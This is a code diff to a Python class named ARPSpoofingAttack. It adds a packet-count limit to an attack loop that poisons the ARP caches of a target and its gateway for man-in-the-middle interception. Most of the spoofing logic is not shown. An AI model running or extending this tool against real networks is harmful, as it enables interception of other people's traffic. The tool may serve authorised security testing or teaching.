@@ -96,6 +96,7 @@ class ARPSpoofingAttack:
         gateway_ip: str,
         interface: str | None = None,
         interval: float = 1.0,
+        count: int = 50,
         verbose: bool = False,
     ):
         """
@@ -106,6 +107,7 @@ class ARPSpoofingAttack:
             gateway_ip (str): IP address of the gateway/router
             interface (str, optional): Network interface to use. If None, will be auto-detected.
             interval (float, optional): Time interval between ARP packets in seconds. Defaults to 1.0.
+            count (int, optional): Number of ARP packet pairs to send (0 for infinite). Defaults to 50.
             verbose (bool, optional): Whether to enable verbose output. Defaults to False.
 
         Raises:
@@ -138,6 +140,7 @@ class ARPSpoofingAttack:
 
         # Set other parameters
         self.interval = max(0.1, interval)  # Ensure reasonable interval
+        self.count = max(0, count)  # 0 means infinite
         self.verbose = verbose
 
         # Initialize state variables
@@ -378,12 +381,19 @@ class ARPSpoofingAttack:
             signal.signal(signal.SIGTERM, self._signal_handler)
 
             # Main attack loop
+            iterations = 0
             while self.running:
                 # Spoof target -> make target think we are the gateway
                 self._spoof(self.target_ip, self.target_mac, self.gateway_ip)
 
                 # Spoof gateway -> make gateway think we are the target
                 self._spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
+
+                iterations += 1
+                # Stop after count iterations (0 means infinite)
+                if self.count > 0 and iterations >= self.count:
+                    self.running = False
+                    break
 
                 # Wait before sending next packets
                 time.sleep(self.interval)
